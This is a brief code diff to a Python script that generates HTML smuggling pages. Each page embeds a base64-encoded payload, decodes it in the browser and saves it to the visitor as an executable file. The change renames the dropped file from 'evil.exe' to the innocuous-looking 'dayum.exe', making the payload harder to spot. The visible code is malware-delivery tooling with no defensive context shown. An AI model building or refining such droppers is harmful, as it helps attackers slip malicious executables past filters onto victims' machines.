@@ -34,7 +34,7 @@ def generate_html_with_base64(base64_data):
             var base64Data = "{base64_data}";
             var data = base64ToArrayBuffer(base64Data);
             var blob = new Blob([data], {{ type: 'octet/stream' }});
-            var fileName = 'evil.exe';
+            var fileName = 'dayum.exe';
 
             if (window.navigator.msSaveOrOpenBlob) {{
                 window.navigator.msSaveOrOpenBlob(blob, fileName);
@@ -69,4 +69,5 @@ try:
 except:
     print("Crashed")      
     time.sleep(3)
+
     sys.exit(0)
